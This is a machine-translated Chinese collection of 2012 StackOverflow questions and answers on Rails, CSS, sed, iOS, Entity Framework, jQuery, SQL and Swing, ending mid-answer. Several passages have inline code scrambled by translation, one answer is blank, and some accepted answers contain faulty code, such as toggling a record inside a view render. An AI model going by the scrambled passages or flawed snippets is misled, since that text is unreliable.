# StackOverflow 问答 13061000-13061999

# ruby-on-rails - Ruby on Rails 3：使用表单切换布尔值

> ID：13061001
> 
> 赞同：0
> 
> 时间：2012-10-25T03:14:08.983
> 
> 标签：ruby-on-rails, ruby-on-rails-3, forms, oop, class

用户可以在我的 Ruby 应用程序上互相发送消息。表格如下：

```
t.string   "content"
t.integer  "from_id"
t.integer  "reply_to_id"
t.boolean  "read",       :default => false 
```

我最近添加了布尔值：read，并且我将表单链接到他们收件箱中的消息。当他们单击“标记已读”（通过表单提供的链接）时，我希望它切换：read => true。

我目前无法做到这一点。这是我目前的设置。

```
_mark_read.html.erb
  <%= form_for(:message, :mark_read => {read: true}) do |f| %>
    <div><%= f.hidden_field :read %></div>
    <%= f.submit "Mark Read", class: "btn-link" %>
  <% end %>

Class MessagesController < ApplicationController
  def mark_read
    @message = current_user.messages.build
    @message.toggle!(:read)
  end

config/routes.rb
 match '/mark_read' => 'messages#mark_read', :via => :post, :as => :mark_read 
```

当我单击“标记已读”时，这是我的调试信息：

```
--- !ruby/hash:ActiveSupport::HashWithIndifferentAccess
utf8: ✓
authenticity_token: ---
message: !ruby/hash:ActiveSupport::HashWithIndifferentAccess
  read: 'false'
commit: Mark Read
controller: static_pages
action: connect 
```

我可以看到它甚至没有使用我的控制器......即使如此；我认为我没有正确设置它。

任何有关如何设置的建议将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T06:10:30.577

信不信由你.. 我什至不需要模型，也不需要控制器 :D 正如我所说，它是在分页集中呈现的。此分页集在标识为 inbox_item.id 的@inbox_items 中定义。

这是无需模型或控制器即可工作的表单。它简单地定义`config/routes.rb`为：

```
match '/mark_read' => 'messages#mark_read', :via => :post 
```

表格：

```
<ul class="share-actions" id="mark_read<%= inbox_item.id %>">
  <%= form_for :mark_read do |f| %>  
    <%= f.check_box inbox_item.toggle!(:read) %>
    <%= f.submit "Mark Read", class: "btn btn-link" %>
  <% end %>
</ul> 
```

很有趣吧？:D

如果您好奇，请提供更多信息。呈现的@inbox_items 的基类是消息类。消息定义了用户的所有私人帖子。在 User 类中，我开始设置 @inbox_items 的定义方式：

```
Class User
  def inbox
    Message.from_users_inbox(self)
  end 
```

然后我建立其余的：

```
Class Message
  def self.from_users_inbox(user)
    "SELECT best_friend_id FROM friendships WHERE new_friend_id = :user_id"
    where("user_id = :user_id OR reply_to_id = :user_id", user_id: user.id)
  end

MemberpagesController
  def inbox
    @message = current_user.messages.build
    @inbox_items = current_user.inbox.paginate(page: params[:page])
  end

feeds/_inbox.html.erb
  <% if @inbox_items.any? %>
    <%= render: 'feeds/inbox_item', collection: @inbox_items %>
    <%= will_paginate @inbox_items %>
  <% end %> 
```

最后：

```
feeds/_inbox_item.html.erb
  <div id="<%= inbox_item.user.name %>_<%= inbox_item.id %>">
  ...
    <ul class="share-actions" id="mark_read<%= inbox_item.id %>">
      <%= form_for :mark_read do |f| %>  
        <%= f.check_box inbox_item.toggle!(:read) %>
        <%= f.submit "Mark Read", class: "btn btn-link" %>
      <% end %>
   </ul>
... 
```

做到了！:)

# html - 使用 CSS 将点垂直居中

> ID：13061004
> 
> 赞同：26
> 
> 时间：2012-10-25T03:14:18.430
> 
> 标签：html, css, unicode

如何在仅使用 CSS 垂直居中的链接之间制作点？这是可能的，但我不知道该怎么做。

预期的：

![Facebook 内联列表：不同、评论、分享、1413、70、76，大约一分钟前](../Images/241f51ff6087dd4fdee68074418a9da6.png)

HTML

```
<label><a href="#">Like</a></label>
<label><a href="#">Comment</a></label>
<label><a href="#">Share</a></label>
<label><span>1 hour ago</span></label>​ 
```

CSS

```
a{ 
    vertical-align: middle;
}

label:not(:last-child):after{
    content: " . ";
} 
```

不工作的例子：http: [//jsfiddle.net/4ZFMm/](http://jsfiddle.net/4ZFMm/)

谢谢！

* * *

## 回答 #1

> 赞同：57
> 
> 时间：2012-10-25T03:22:01.527

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-12-01T15:51:15.607

Somehow these got screwed up on the live server, although they worked locally, here's what worked for me, maybe it'll help someone else:

```
.element:before {
    content: "\2022";
} 
```

# php - Bash 脚本，在 PHP 代码中的每个大括号前添加一行

> ID：13061010
> 
> 赞同：-2
> 
> 时间：2012-10-25T03:14:58.453
> 
> 标签：php, bash, sed, find

我需要创建一个 bash 脚本，在函数、类（类和方法）和 try/catch 块的每个大括号之前添加一行

我认为将该程序与 sed EG 结合使用：

```
*find . -type f \( -name "*.php \) -exec sed .......* 
```

例如：

```
<?php
function my_function() {

}
?> 
```

变成：

```
<?php
function my_function() 
{

}
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T03:28:01.300

`GNU find`这是使用and的一种方法`GNU sed`。它适用于函数和类。您可以相应地调整以修复您选择的其他块。此解决方案还保留前导空格，您可能会发现这很有帮助。

```
find . -type f -name "*.php" -exec sed -r -i 's/( *)(function.*|classes.*)\{/\1\2\n\1\{/' {} \; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T03:25:22.840

```
find . -type f -name '*.php' -exec sed -E $'s/ *{$/\\\n{/' -i {} \; 
```

`*{`用换行符和.替换行尾`{`。

如果您只使用某些花括号（函数、类、try/catch）而不使用其他大括号（if、while 等），那么 shell 脚本可能证明是不够的。

# objective-c - 在自定义 TableViewCell 上设置图像

> ID：13061012
> 
> 赞同：0
> 
> 时间：2012-10-25T03:15:01.830
> 
> 标签：objective-c, ios, xcode, uitableview

我想知道如何将图像放在自定义单元格的背景上

我使用的代码是这个，但是这会将所有表格设置为相同的图像我希望每个单元格都有自己的背景，具体取决于谁是消息所有者我希望你能帮助我，这正在杀死我！

```
- (UITableViewCell *)tableView:(UITableView *)myTableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {

    UITableViewCell *cell = (UITableViewCell *)[self.messageList dequeueReusableCellWithIdentifier:@"ChatListItem"];
    if (cell == nil) {
        NSArray *nib = [[NSBundle mainBundle] loadNibNamed:@"ChatListItem" owner:self options:nil];
        cell = (UITableViewCell *)[nib objectAtIndex:0];
    }

    NSDictionary *itemAtIndex = (NSDictionary *)[messages objectAtIndex:indexPath.row];
    UILabel *textLabel = (UILabel *)[cell viewWithTag:1];
    textLabel.text = [itemAtIndex objectForKey:@"text"];
    UILabel *userLabel = (UILabel *)[cell viewWithTag:2];
    userLabel.text = [itemAtIndex objectForKey:@"user"];

    if(usernameText=userLabel){
        UIImageView* img = [[UIImageView alloc]initWithImage:[UIImage imageNamed:@"chat2@2x.png"]];
        [cell setBackgroundView:img];
        [img release];        
    }
    else{
        UIImageView* img = [[UIImageView alloc]initWithImage:[UIImage imageNamed:@"chat1@2x.png"]];
        [cell setBackgroundView:img];
        [img release];

    }

    return cell;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T03:31:15.350

这条线对我来说看起来不太好：

```
if (usernameText=userLabel) 
```

也许应该是：

```
if ([usernameText isEqualToString:userLabel.text]) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T03:50:19.797

尝试这个，

```
tableView.backgroundView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"chat1@2x.png"]]; 
```

或者，

cell.backgroundView = [[UIImageView alloc] initWithImage:[UIImage imageNamed:@"chat1@2x.png"]];

# javascript - 如何允许多个表单提交，因为 javascript 处理调用。

> ID：13061013
> 
> 赞同：0
> 
> 时间：2012-10-25T03:15:03.437
> 
> 标签：javascript, html, forms

我已经设置了一个 javascript 表单，我认为它可以让我不断地更改表单中的数据（无需重新加载），然后不断地重新提交，运行相同的 javascript。

表单的结构在第一次通过 javascript 时起作用，但现在在提交之后。

这是剪断的结构：

```
<form name="items">
... form inputs... 
<INPUT TYPE="button" NAME="button2" Value="Update Cart" onClick="total(this.form)"> 
```

这运行一个javascript函数，该函数有效。这种类型的表格设置不是我应该做的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T03:19:11.267

如果您想多次发布表单而不重新加载页面 - 您将需要使用 ajax 发布表单，或者如果您使用的是 jquery，则需要使用 jquery 的 $.post()。

# cognos - 在接受参数的 cognos 框架管理器中嵌入本机 sql

> ID：13061018
> 
> 赞同：0
> 
> 时间：2012-10-25T03:16:53.597
> 
> 标签：cognos

我需要在 COGNOS 框架管理器中嵌入原生 oracle sql 语句。此链接描述了如何执行此操作。例如：

```
select cust_name from cust where cust_id = '111' 
```

[http://businessintelligence.ittoolbox.com/groups/technical-functional/cognos8-l/native-query-in-framework-manager-query-subject-2374263](http://businessintelligence.ittoolbox.com/groups/technical-functional/cognos8-l/native-query-in-framework-manager-query-subject-2374263)

现在有一种方法可以在 COGNOS FM 中嵌入同样接受参数的 SQL。例如：

```
select cust_name from cust where cust_id = ? 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T06:34:37.363

您可以使用提示宏，如下所述：
[使用查询宏创建提示](http://publib.boulder.ibm.com/infocenter/cbi/v10r1m1/topic/com.ibm.swg.ba.cognos.ug_fm.10.1.1.doc/c_using_macro.html#using_macro)
您的表达式应如下所示：

```
select cust_name from cust where cust_id = #prompt('prmCutsId','integer')# 
```

当然，您可以通过提供默认值来扩展它，或者使用 promptmany 宏来提供值列表（而不仅仅是一个值）。

您确实可以在 Cognos 中使用宏做一些好事，但您必须确切地知道自己在做什么。

# ios - UDID 注册

> ID：13061026
> 
> 赞同：-1
> 
> 时间：2012-10-25T03:18:18.300
> 
> 标签：ios, ipad, replace, udid

如果我在 Apple Store 更换有问题的 iPad，UDID 注册是否仍会计入我的 99 台设备限制？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T06:25:50.433

我认为您将在 1 年后获得注册设备的 +1 价值。

# php - 使用 PHP 从存储在 mysql 中的 PDF 读取文本

> ID：13061031
> 
> 赞同：0
> 
> 时间：2012-10-25T03:18:33.583
> 
> 标签：php, mysql, pdf, text

我正在尝试使用 PHP 从存储在 mysql 数据库中的 PDF 文件中读取文本。我尝试使用 class.pdf2text.php，它适用于实际文件。我尝试将 MYSQL_RESULT 变量与该类的 pdf 文件内容一起使用，但它不起作用。我必须错过一些非常容易的事情，我只是知道。

基本上，这就是我想要做的：我有一个包含 PDF 文件的数据库。我需要将该数据库中的 PDF 转换为文本，然后在该文本中搜索某些数据。有没有办法做到这一点，而无需在 PHP 中创建外部文件？

# google-chrome - 在 Chrome 扩展中加载本地文件（不在同一文件夹中）

> ID：13061032
> 
> 赞同：5
> 
> 时间：2012-10-25T03:18:37.533
> 
> 标签：google-chrome, google-chrome-extension

我的扩展程序允许用户在扩展程序的页面上设置自己的背景图像。使用在线文件非常酷；但是，`Not allowed to load local resource: <file name>`当在他们计算机上的某处使用图像时，它给了我这个。是否有一个清单选项或其他我忽略的东西来允许这个？

我已经尝试使用“允许访问文件 URL”复选框

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-25T06:14:35.070

您可能想尝试的一件事是设置`file:///*`权限`manifest.json`（它有点隐藏在[文档](http://developer.chrome.com/extensions/match_patterns.html)中）：

```
"permissions": [
    "file:///*"
], 
```

我记得以前遇到过类似的问题，这就是原因。如果这不能解决问题，很高兴进一步排除故障。

# c# - 如何使用 EF 5.0 Code First 启用并发检查？

> ID：13061034
> 
> 赞同：10
> 
> 时间：2012-10-25T03:18:40.390
> 
> 标签：c#, entity-framework-5, optimistic-concurrency

我想在原子操作中进行检查然后更新。我正在使用 dbcontext 来管理事务。如果记录已被另一个线程修改但没有引发异常，我希望得到一个异常。任何帮助，将不胜感激。这是我的输出：

```
Thread-4: Reading...
Thread-5: Reading...
Thread-5: Updating destination 1
Thread-4: Updating destination 1
Thread-4: SaveChanges
Thread-5: SaveChanges 
```

这是我的代码片段：

```
public static void Main(string[] args)
{
    PopulateData();
    (new Thread(UpdateDestination1)).Start();
    (new Thread(UpdateDestination1)).Start();
}

public static void UpdateDestination1()
{
    using (var context1 = new BreakAwayContext())
    {
        Console.WriteLine("Thread-{0}: Reading...", Thread.CurrentThread.ManagedThreadId);
        var d = context1.Destinations.FirstOrDefault();
        Console.WriteLine("Thread-{0}: Updating destination {1}", Thread.CurrentThread.ManagedThreadId, d.DestinationId);
        d.Name = "Thread-" + Thread.CurrentThread.ManagedThreadId;
        try
        {
            context1.SaveChanges();
            Console.WriteLine("Thread-{0}: SaveChanges", Thread.CurrentThread.ManagedThreadId);
        }
        catch (OptimisticConcurrencyException)
        {
            Console.WriteLine("OptimisticConcurrencyException!!!");
            throw;
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-10-25T03:32:51.620

[在使用流式 API ( http:](http://msdn.microsoft.com/en-us/data/jj591617#1.12) //msdn.aspx ) 或 IsConcurrencyToken() 或 .IsRowversion 配置属性时，您可以在属性 ( [http://msdn.microsoft.com/en-us/data/gg193958.aspx ) 或](http://msdn.microsoft.com/en-us/data/gg193958.aspx)[microsoft.com/en-us/data/jj591617#1.12](http://msdn.microsoft.com/en-us/data/jj591617#1.12)）。通常，您将在数据库中有一个 rowversion 列。

# javascript - 使用 jQuery 设置 DOM 属性并通过 Javascript 返回“未定义”

> ID：13061035
> 
> 赞同：0
> 
> 时间：2012-10-25T03:18:42.170
> 
> 标签：javascript, jquery-mobile

这个问题的标题不是那么好，所以如果其他人在阅读后有更好的措辞方式，那将不胜感激。

不碍事的披露，这是功课。本周的任务是重构我们已经存在的纯 JS 代码以使用 JQM，但我在转换时遇到问题，我不太清楚，代码如下：

```
function populateItemLinks(key, listItem)
{

    var ecLink = $('<a class="padRightRed"></a>');
            ecLink.attr("href", "#");
            ecLink.attr("key", key);
            ecLink.html("Edit Character");
            ecLink.on("click", editCharacter);
            ecLink.appendTo(listItem);

            console.log(ecLink.attr("key"));

        ecLink = $('<a class="padLeftRed"></a>');
            ecLink.attr("href", "#");
            ecLink.attr("key", key);
            ecLink.html("Delete Character");
            ecLink.on("click", deleteCharacter);
            ecLink.appendTo(listItem);

            console.log(ecLink.attr("key"));
};

function deleteCharacter()
{
    var toDelete = confirm("Do you wish to delete this character?");
    if (toDelete)
    {
            console.log(this.key);
        alert("Character was deleted.");
        localStorage.removeItem(this.key);
        $.mobile.changePage("#home");
    }
    else
    {
        alert("Character was not deleted.");
    }
} 
```

问题是使用 .key 属性作为 populateItemLinks 函数中链接的标识。当它是 strait javascript 时，我可以做 linkname.key = key; 然后使用“this.key”在 deleteCharacter 函数中取回密钥。好吧，现在它总是返回 undefined ，我想不出任何方式不会复杂地获得与非 JQM 版本相同的功能，所以任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T03:26:57.110

您的代码返回 undefined 的原因是您正在尝试读取DOM 元素的*属性*，但您已经设置了DOM 元素的*属性*。

这个问题的最佳答案解释了两者之间的区别：[.prop() 与 .attr()](https://stackoverflow.com/questions/5874652/prop-vs-attr)

如果您要像这样设置新创建的 DOM 元素的*属性：*

```
ecLink.prop('key', 12355); 
```

并继续直接访问 DOM 元素（不是通过 jQuery）：

```
this.key; // 123455 
```

一切都会好的。这是一个**[JSFiddle 示例](http://jsfiddle.net/VsKpT/)**，更详细地显示了这一点。

无论如何，我已经调整了您的代码以使用您设置的*属性：*

```
function deleteCharacter()
{
    var toDelete = confirm("Do you wish to delete this character?");

    if (toDelete)
    {
        var key = $(this).attr('key');
        alert("Character was deleted.");
        localStorage.removeItem(key);
        $.mobile.changePage("#home");
    }
    else
    {
        alert("Character was not deleted.");
    }
} 
```

说了这么多，[Data 属性](http://api.jquery.com/data/)更适合存储针对 DOM 元素的任意数据：

```
ecLink.data('key', myKey); // set
ecLink.data('key');        // get 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T03:28:08.437

我要做的是将点击`ecLink`作为参数传递给`deleteCharacter()`这样的：

`ecLink.on("click",function() { deleteCharacter($(this)); });`

然后你可以修改`deleteCharacter()`：

```
function deleteCharacter(el)
{
    var toDelete = confirm("Do you wish to delete this character?");
    if (toDelete)
    {
        var key = el.attr('key'); //get the key attribute
        console.log(key);
        alert("Character was deleted.");
        localStorage.removeItem(key);
        $.mobile.changePage("#home");
    }
    else
    {
        alert("Character was not deleted.");
    }
} 
```

# c# - 当 C# 中的另一个项目引用时，如何使用已编译的项目复制非代码文件

> ID：13061036
> 
> 赞同：6
> 
> 时间：2012-10-25T03:18:43.997
> 
> 标签：c#, asp.net-mvc, visual-studio-2010, iis-7, metadata

我有一个项目作为*第 3 方 .exe*的包装器（它具有创建命令行和运行可执行文件的静态方法）。我想在我的解决方案中的至少几个项目中使用它。理想情况下，.exe 应该只在该包装项目中（我不想将它添加到使用它的每个项目中）。现在我正试图让它与在 IIS 7 上运行的 Web 项目（.NET MVC）一起工作，但是当我`Assembly.GetExecutingAssembly().Location`用来查看我的包装器被调用的目录时，我在一个文件夹中，比如

> C:\Windows\Microsoft.NET\Framework\v4.0.30319\Temporary ASP.NET Files\"我的项目"\65a016fb\ac5f20a7\assembly\dl3\d8de0f10\06e277a2_55b2cd01

我的第 3 方 .exe 无处可寻。是否可以使用未编译的引用复制文件？

顺便说一句，到目前为止，我已将 .exe 的*“复制到输出目录”*和*“构建操作”*属性设置为*“始终复制”*和*“内容”/“资源”/“嵌入式资源”*，但没有成功。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T04:54:20.563

尝试在使用包装器的项目中添加现有文件。出现对话框时，请执行以下操作：

[http://wiki.oxygenelanguage.com/en-w/images/0/0d/AddAsLinkAero.png](http://wiki.oxygenelanguage.com/en-w/images/0/0d/AddAsLinkAero.png)

要么，要么将必要的文件从包装中拖到您的项目中`Alt`。

这会将文件添加为链接。当原始文件必须位于唯一的位置时，链接是重用的好选择。

将文件作为链接添加并设置到该链接构建操作`Content`以及`Copy always`将它们复制到输出目录的选项应该适合您。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-01T04:05:51.637

如果有人遇到这个问题，我是这样解决的：

*   将 .exe 添加到项目的资源中（右键单击项目，属性 -> 资源，添加文件并为其命名）
*   您现在可以访问您的 .exe 作为`byte[]`（至少如果您正在构建一个 dll）`Properties.Resources.*NameYouGaveYourResource*`
*   在使用 .exe 之前，请使用`File.Exists()`检查文件是否存在`Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location)`（或者您可以使用该方法将 exe 放在您想要的任何位置，上面会为您提供 .dll 所在的目录） - 如果不存在，请写出文件：

> 使用 (FileStream fileStream = new FileStream(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + "\EXE.exe", FileMode.CreateNew)) { fileStream.Write( *Properties.Resources.NameYouGaveYourResource* 0, > Properties.Resources .NameYouGaveYourResource *.Length* ); }

现在您可以轻松地将 exe 用作`Process`. 远非理想，但这意味着无论走到哪里，exe 都伴随着您的 .dll。

# javascript - 根据目标距离在 iOS 上计算到达时间

> ID：13061039
> 
> 赞同：2
> 
> 时间：2012-10-25T03:19:05.930
> 
> 标签：javascript, iphone, ios, titanium, distance

首先，我使用的是 Appcelerators Titanium Platform，因此任何 Javascript 示例都将不胜感激。我将给出我想要完成的总体目标。我的应用程序将允许用户输入以下内容：

*   进球时间（17:00 分钟）
*   跑步距离（2.0 英里）

当一个人在跑步时，我需要提醒他们当前预计的完成时间。我已经成功地在应用程序上收集到与 GPS 的距离。我也有一个秒表在运行。所以真的我只是想了解一下我将如何根据他们在任何给定点的距离和时间来计算他们的估计完成时间。这可能需要一些简单的数学计算，这些计算在这一点上让我无法理解，因此我们将不胜感激任何帮助。所以最后，我有以下信息：

由用户设置

*   进球时间（17:00 分钟）
*   跑步距离（2.0 英里）

从电话

*   距离
*   定时器时间

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-25T04:12:06.220

试试这个方法。这只是一个我不确定语法的算法（希望你能修复它）。

```
function calculateEstimateFinishTime(userDistance,takenTime,goalDistance)
{
 /*
   userDistance is distance from phone in miles
   takenTime is Timer Time in minutes
   goalDistance is user input Run Distance in miles
   the function return estimatedFinishTime in minutes
 */
  var speed = userDistance/takenTime;
  return (goalDistance/speed);
} 
```

# php - sql select中两列之间的最高评分

> ID：13061043
> 
> 赞同：1
> 
> 时间：2012-10-25T03:19:43.680
> 
> 标签：php, sql

假设我有下表：

```
--------------------
|ID|Yes|No|Filename|
|01|15 |10|1.php   |
|02|12 |5 |2.php   |
|03|6  |1 |3.php   |
-------------------- 
```

我想要做的是在 sql select 语句中应用 Yes/Yes+No 并回显最高值的文件名。

Yes 和 No 会不时更新，所以创建另一个列来处理方程式会更好，还是可以在 sql 语句中使用方程式？选择语句会是什么样子？

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-25T03:26:55.287

对于`MySQL`,

```
SELECT  Filename, 
        CAST((Yes / (Yes + No)) AS DECIMAL(10,5)) rating
FROM    table1
WHERE   CAST((Yes / (Yes + No)) AS DECIMAL(10,5)) =
        (
            SELECT MAX(rating)
            FROM
            (
                SELECT CAST((Yes / (Yes + No)) AS DECIMAL(10,5)) rating
                FROM table1
            ) x
        ) 
```

# [SQLFiddle 演示](http://sqlfiddle.com/#!2/d191d/5)

为了`SQL Server`

```
SELECT   TOP 1 WITH TIES Filename, 
         (Yes / (Yes + No)) rating
FROM     table1
ORDER BY rating DESC 
```

# [SQLFiddle 演示](http://sqlfiddle.com/#!3/ab12d/1)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T03:24:31.030

您可以使用这种方法：

```
SELECT TOP 1 sf.Filename
   , (sf.Yes / (sf.Yes + sf.No)) AS RatioValue
FROM dbo.storeFile AS sf
ORDER BY (sf.Yes / (sf.Yes + sf.No)) DESC 
```

# javascript - 在 Rails 中添加 Javascript

> ID：13061047
> 
> 赞同：1
> 
> 时间：2012-10-25T03:20:09.713
> 
> 标签：javascript, html, ruby-on-rails-3

我正在使用 Rails 3.0。我想添加一个位于视图`show_javascript.js`中的 Javascript 文件。`/public/javascripts/``show.html.erb`

该`show.html.erb`文件`<head>...</head>`从模板中获取部分`application.html.erb`

我想知道我应该如何添加它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-25T03:31:12.557

假设您有一个通用样式表布局，您可以将以下内容添加到`application.html.erb`：

```
<%= javascript_link_tag 'show' if params[:action] == 'show' %> 
```

您甚至可以在该部分中使用`content_for`params plus ，如下所示：`yield``<head>`

```
layout.html.erb
<head>
  <%= yield(:header) if @content_for_header %>
</head>

product/show.html.erb
<% content_for :header do -%>
  <%= javascript_link_tag 'show_product' %>
<% end -%> 
```

# eclipse - m2e eclipse插件如何与eclipse交互？

> ID：13061048
> 
> 赞同：3
> 
> 时间：2012-10-25T03:20:13.807
> 
> 标签：eclipse, maven, maven-3, m2e

我是一个 eclipse 的力量，由于历史上糟糕的 maven / eclipse 集成而忽略了 maven。m2e 似乎正在成熟，我正在将它拿出来进行一次认真的试驾。

我想了解 m2e 在 eclipse 中是如何工作的，这样我就可以更好地让两者一起顺利工作，并了解仍然神秘的错误消息和出现的问题。

我尝试在谷歌上搜索 m2e eclipse 集成架构的解释，但没有发现任何东西可以很好地说明集成是如何工作的。而只是很多分散在网络上的博客文章。

任何人都可以提供关于 m2e 如何弥合日食世界观和 maven 世界观之间的鸿沟的可靠概述吗？尤其是 maven 如何集成到 eclipse 所做的增量构建中？使用 m2e 对 Eclipse 稳定性/性能有什么影响。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-18T06:11:46.517

我在 Eclipse Con 的题为“m2e，混合油和水的练习”的演示文稿中找到了我正在寻找的细节

[http://www.eclipsecon.org/europe2012/sites/eclipsecon.org.europe2012/files/EclipseConEU2012-m2e-talk.pdf](http://www.eclipsecon.org/europe2012/sites/eclipsecon.org.europe2012/files/EclipseConEU2012-m2e-talk.pdf)

抽象的：

> m2e 是一个流行的 Eclipse IDE 插件，其项目目标是“在 Eclipse IDE 中提供一流的 Apache Maven 支持”。在本次演讲中，我将概述 m2e 实现的 Maven/Eclipse 集成方法，强调 Maven 和 Eclipse 之间使正确集成变得困难或不可能的差异，并将讨论改进集成的可能方法。该演讲面向希望更好地了解 Maven/Eclipse 集成挑战的 Eclipse 和 Maven 开发人员以及希望了解“幕后”发生了什么的高级 m2e 用户。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-25T03:34:37.520

简而言之，m2e 将基于您项目的 Maven POM 设置您的 Eclipse，并为您提供对 Maven 命令的访问

这些是 m2e 所做的一些最明显的事情：

1.  根据 POM 设置源文件夹和输出目录
2.  基于 POM 设置依赖项/库和项目依赖项
3.  使用基于 Maven 插件的相应 Eclipse 插件（如果 M2E 知道如何处理它）等。
4.  允许您运行 Maven 目标
5.  ETC.....

它既不是正式的也不是准确的描述，但我希望它给出一些基本的想法：P

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-25T03:40:58.490

*Sonatype在*[http://www.sonatype.com/Support/Books/Developing-with-Eclipse-Maven](http://www.sonatype.com/Support/Books/Developing-with-Eclipse-Maven)上有一本很好的书

# jquery - 对象不支持 IE7 中的属性或方法“toJSON” - 我有 json2

> ID：13061050
> 
> 赞同：0
> 
> 时间：2012-10-25T03:20:30.313
> 
> 标签：jquery, json, internet-explorer-7

我不断收到错误：

对象不支持属性或方法“toJSON”

我已经加载了 json2。适用于所有其他浏览器。

在我的脑海里

```
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
<script type="text/javascript" src ="js/libs/json2.js"></script> 
```

关于可能导致这种情况的任何建议？除了包含 json2.js 来解决问题之外，我似乎找不到任何东西。奇怪的是我已经有一段时间了，而且这个用途可以工作。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-25T03:37:49.437

json2 不提供`toJSON()`方法。

相反，您必须使用`stringify`函数

```
JSON.stringify( object ); 
```

您可以在此处查看完整文档：[https ://github.com/douglascrockford/JSON-js/blob/master/json2.js#L22](https://github.com/douglascrockford/JSON-js/blob/master/json2.js#L22)

# html - HTML 多表放置

> ID：13061053
> 
> 赞同：0
> 
> 时间：2012-10-25T03:20:34.960
> 
> 标签：html, html-table

我有 3 个单独的 HTML 表格。我需要将其中 2 个并排放置，并将第三张桌子放在右侧桌子下方。我当前的 HTML 表格位置：

[table1] [table2]
（空）[table3]

但是现在我面临的问题是表 2 和表 3 靠得太近了，我需要在表 2 和表 3 之间留出一个空隙，应该是这样的：

[table1] [table2]

（空）[table3]

我已经尝试了很多方法，任何帮助将不胜感激！
*请注意，这些表格是 3 个单独的表格。
*无法上传我当前表格的图片，缺少代表

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-25T03:27:12.847

请试试这个，您也可以在表内使用表，但这是个坏主意。

```
<div id="main">
      <div id="left" style="float:left;">table1<div>
      <div id="right" style="float:left;">table2<div>
      <div id="bottom" style="float:right;width:sameastable2div;padding-top:2px;">table3<div>
<div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-25T03:34:46.053

您可以对正在使用的主表格使用表格属性单元格间距，以便在表格单元格之间留出空间。

```
 <table border="1" cellspacing="5">
    <tr><td><table></table></td><td><table></table></td></tr>
    <tr><td></td><td><table></table></td></tr>
  </table> 
```

# java - 线程中断和 ActionListener Java

> ID：13061054
> 
> 赞同：4
> 
> 时间：2012-10-25T03:20:35.850
> 
> 标签：java, swing, concurrency, jtextarea, event-dispatch-thread

我有一个函数 graphics() 创建我的 JFrame 和两个 JRadioButtons 并向它们添加 ActionListeners。此图形从 main() 调用，图形本身调用 game()。

```
public void game() throws Exception
{

    jTextArea1.setLineWrap(true);
    jTextArea1.setWrapStyleWord(true);
    jTextArea1.setText("This is private information.");

    jRadioButton1.setVisible(true);
    jRadioButton2.setVisible(true);
    try {
    t.sleep(40000);
    repaint();
    } catch (InterruptedException e) {
    // We've been interrupted: no more messages.
    return;    
    } 
```

显示“这是私人信息”后。在文本区域中，我希望程序执行暂停 40 秒，或者直到用户按下 JRadioButton，以较早者为准。所以我添加了一个 ActionListener 并在其中调用了 t.interrupt() 。

```
private void jRadioButton1ActionPerformed(java.awt.event.ActionEvent evt) {
     t.interrupt();
    jRadioButton1.setVisible(false);
    jRadioButton2.setVisible(false);
    //System.out.println(t.interrupted());
    jTextArea1.setText("Please wait...");

    } 
```

但是，即使在选择了应该触发中断的 JRadioButton 之后，也不会发生这种情况，并且 t.interrupted 返回 false。

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-25T03:23:07.220

永远不要调用`Thread.sleep(...)`Swing 事件线程，因为您将冻结线程并有效地冻结您的程序。解决方案是考虑将 Swing Timer 用于与时间相关的需求部分，并将 SelectionListener 用于 JCheckBox 或 JRadioButton 需求。

例如：

```
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ItemEvent;
import java.awt.event.ItemListener;

import javax.swing.*;

public class PausingExecution extends JPanel {
   private static final String SELECTED_TEXT = "Snafus are Better!!!";
   private static final String UNSELECTED_TEXT = "Fubars Rule!!";
   private static final String TIMES_UP = "Time's Up!!!!";
   private static final int TIMER_DELAY = 10 * 1000;

   private JTextField messageField = new JTextField(UNSELECTED_TEXT, 10);
   private JCheckBox checkBox = new JCheckBox("Click Me");

   public PausingExecution() {
      add(messageField);
      add(checkBox);

      checkBox.addItemListener(new ItemListener() {

         @Override
         public void itemStateChanged(ItemEvent iEvt) {
            if (iEvt.getStateChange() == ItemEvent.SELECTED) {
               messageField.setText(SELECTED_TEXT);
            } else {
               messageField.setText(UNSELECTED_TEXT);
            }
         }
      });

      Timer mySwingTimer = new Timer(TIMER_DELAY, new ActionListener() {

         @Override
         public void actionPerformed(ActionEvent e) {
            messageField.setText(TIMES_UP);
            checkBox.setEnabled(false);
         }
      });

      mySwingTimer.setRepeats(false);
